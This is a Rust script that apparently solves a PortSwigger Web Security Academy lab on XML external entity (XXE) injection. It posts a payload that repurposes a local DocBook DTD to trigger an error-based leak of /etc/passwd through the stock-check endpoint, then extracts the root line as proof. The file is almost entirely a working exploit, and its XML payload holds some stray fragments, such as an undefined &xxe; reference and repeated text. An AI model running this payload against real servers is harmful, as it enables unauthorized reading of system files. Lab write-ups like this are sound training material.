/**************************************************************************
*
* Lab: Exploiting XXE to retrieve data by repurposing a local DTD
*
* Hack Steps:
*      1. Repurpose a local DTD to retrieve the content of /etc/passwd
*      2. Extract the first line as a proof
*
***************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ad2008c04bc73e082dbacf2001700e0.web-security-academy.net";

fn main() {
    println!("â¦—#â¦˜ Injection point: {}", "Check stock request".yellow(),);
    print!("â¦—1â¦˜ Repurposing a local DTD to retrieve the content of /etc/passwd.. ");
    flush_terminal();

    let payload = r###"<?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE foo [
                        <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
                        <!ENTITY % ISOamso '
                        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                        &#x25;eval;
                        &#x25;error;
                        '>
                        %local_dtd;
                        ]>
                        <stockCheck>
                            <productId>
                                &xxe;
                            </productId>
                            <storeId>
                                1
                            </storeId>external entities
                            external entities
                        </stockCheck>"###.to_owned();
    let check_stock = check_stock_with_payload(payload);

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Extracting the first line as a proof.. ");
    flush_terminal();

    let body = check_stock.text().unwrap();
    let first_line = capture_pattern_from_text("/(root:.*)\n", &body);

    println!("{} => {}", "OK".green(), first_line.yellow());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn check_stock_with_payload(payload: String) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "â¦—!â¦˜ Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
